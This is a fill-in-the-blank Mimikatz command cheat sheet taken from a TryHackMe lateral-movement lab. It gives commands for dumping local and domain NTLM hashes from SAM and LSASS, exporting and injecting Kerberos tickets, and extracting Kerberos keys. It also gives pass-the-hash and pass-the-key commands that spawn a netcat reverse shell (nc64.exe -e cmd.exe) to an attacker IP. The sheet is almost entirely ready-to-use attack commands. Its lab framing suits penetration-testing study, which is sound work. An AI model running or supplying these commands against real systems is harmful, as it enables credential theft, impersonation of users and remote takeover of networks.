# Mimikatz Commands

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

```
privilege::debug
```
```
token::elevate
```
This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available:
```
lsadump::sam
```
This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.
```
sekurlsa::msv
```

We can then use the extracted hashes to perform a Pass the Hash (PtH) attack by using mimikatz to inject an access token for the victim user on a reverse shell (or any other command you like) as follows:
```
token::revert
```
```
sekurlsa::pth /user:[USERNAME] /domain:[DOMAIN] /ntlm:[HASH] /run:"c:\tools\nc64.exe -e cmd.exe [ATTACK-IP] [PORT]"
```
Example:
```
sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe 10.50.61.3 5555"
```
Notice we used token::revert to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work. This would be the equivalent of using runas /netonly but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user. Interestingly, if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH.  

Sometimes it will be possible to extract Kerberos tickets and session keys from LSASS memory using mimikatz. The process usually requires us to have SYSTEM privileges on the attacked machine and can be done as follows:
```
privilege::debug
```
```
sekurlsa::tickets /export
```
Notice that if we only had access to a ticket but not its corresponding session key, we wouldn't be able to use that ticket; therefore, both are necessary.  

While mimikatz can extract any TGT or TGS available from the memory of the LSASS process, most of the time, we'll be interested in TGTs as they can be used to request access to any services the user is allowed to access. At the same time, TGSs are only good for a specific service. Extracting TGTs will require us to have administrator's credentials, and extracting TGSs can be done with a low-privileged account (only the ones assigned to that account).  

Once we have extracted the desired ticket, we can inject the tickets into the current session with the following command (Example):
```
kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

Injecting tickets in our own session doesn't require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, you can use the klist command:
```
klist
```

We can obtain the Kerberos encryption keys from memory by using mimikatz with the following commands:
```
privilege::debug
```
```
sekurlsa::ekeys
```

Depending on the available keys, we can run the following commands on mimikatz to get a reverse shell via Pass-the-Key.  
If we have the RC4 hash:
```
sekurlsa::pth /user:[USERNAME] /domain:[DOMAIN] /rc4:[HASH] /run:"c:\tools\nc64.exe -e cmd.exe [ATTACK-IP] [PORT]"
```
If we have the AES128 hash:
```
sekurlsa::pth /user:[USERNAME] /domain:[DOMAIN] /aes128:[HASH] /run:"c:\tools\nc64.exe -e cmd.exe [ATTACK-IP] [PORT]"
```
If we have the AES256 hash:
```
sekurlsa::pth /user:[USERNAME] /domain:[DOMAIN] /aes256:[HASH] /run:"c:\tools\nc64.exe -e cmd.exe [ATTACK-IP] [PORT]"
```

**********************************************************************

## Reference

* https://tryhackme.com/room/lateralmovementandpivoting
